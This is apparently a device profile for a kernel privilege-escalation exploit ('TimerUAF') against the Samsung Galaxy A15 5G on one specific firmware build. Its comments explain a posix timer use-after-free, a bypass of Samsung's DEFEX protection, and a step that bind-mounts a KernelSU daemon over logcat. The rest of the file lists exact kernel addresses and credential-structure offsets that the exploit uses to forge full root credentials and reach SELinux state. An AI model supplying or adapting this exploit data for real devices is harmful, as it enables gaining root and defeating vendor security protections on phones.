# TimerUAF kernel profile: Samsung Galaxy A15 5G (SM-A1560, a15xzh)
#
# Samsung mode profile.  Like the S26 Ultra profile it keeps the generic
# timer-UAF trigger and adds the vendor endgame:
#
#   - Samsung DEFEX creds_fast_hash bypass (defex_creds_hash below)
#   - worker moves to u:r:init:s0 and bind-mounts the bundled diabl0w/KernelSU
#     ksud over /system/bin/logcat so KDP does not SIGKILL a direct exec
#   - ksud late-load is pinned to the diablo0w/KernelSU manager package
#     (me.weishu.kernelsu, versionName samsung-v*), no manager discovery
#   - SELinux is left to ksud's own restore (no userspace re-enforce)
#
# Every constant is derived from the factory boot.img of
# samsung/a15xzh/a15x:16/BP4A.251205.006/A1560ZHSAEZG1 (kernel
# 5.15.189-android13-8-33641424, 4K pages).  The release is a prefix because
# Samsung firmware appends its own build suffix.
#
#   5.15 init_posix_timers (__initstub__kmod_posix_timers__387_281):
#       kmem_cache_create_usercopy("posix_timers_cache", 0x108, ...)
#   do_timer_create:
#       ldr x0, [posix_timers_cache]; bl kmem_cache_alloc at
#       0xffffffc0082048c0 -> return 0xffffffc0082048c4
#   copy_process calls dup_task_struct, whose bl kmem_cache_alloc at
#       0xffffffc0080c9ea4 returns to 0xffffffc0080c9ea8
#       -> low21 0xc9ea8 (5.15 has no kmem_cache_alloc_node here)
#   fork_init: kmem_cache_create_usercopy("task_struct", 0x1200, 64, ...);
#       arch_task_struct_size is absent, so task_alloc_bytes stays 0x1200
#   cred_init: kmem_cache_create_usercopy("cred_jar", 0xb0, ...,
#       SLAB_HWCACHE_ALIGN) -> 4-byte usage, object 0xc0
#   get_task_creds: pid <= 0x8000 indexes creds_fast_hash directly as
#       an 8-byte pointer array; creds_fast_hash_init zeroes 0x40000 bytes
#       at 0xffffffc00ac53740
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers() (0xffffffc0084c8e4c /
# 0xffffffc0084c8e5c).  SELinux is the first cred-blob LSM
# (capability, integrity, selinux); DEFEX registers no cred blob.
release_prefix = "5.15.189-android13-8-33641424"
schema_version = 1
ksu_kmi = "android13-5.15"

# Samsung endgame switches.
samsung_mode = 1
samsung_package = "me.weishu.kernelsu"
# creds_fast_hash: direct 8-byte pointer array indexed by pid.
defex_creds_hash = 0xffffffc00ac53740

# 4K-page build.
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 5.15 frees the order-1 slab through the PCP lists.
pcp_free = 1
alloc_req_off = 0x10

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) return address.
timer_site = 0xffffffc0082048c4
timer_alloc = 0x108
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xb0, HWCACHE_ALIGN bytes_alloc=0xc0.
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
fake_cred_off = 0x18

# Link-time symbols (kallsyms).
selinux_state = 0xffffffc00abcded8
panic_on_warn = 0xffffffc00a8dadd0

# task_struct / cred layout (BTF).
task_cred_off = 0x798
copy_process_low21 = 0xc9ea8
task_alloc_bytes = 0x1200

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a901410
init_user_ns = 0xffffffc00aa6cda8
init_ucounts = 0xffffffc00a902828
init_groups = 0xffffffc00a9024b0

# task_security_struct: SELinux is the first cred-blob LSM here.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
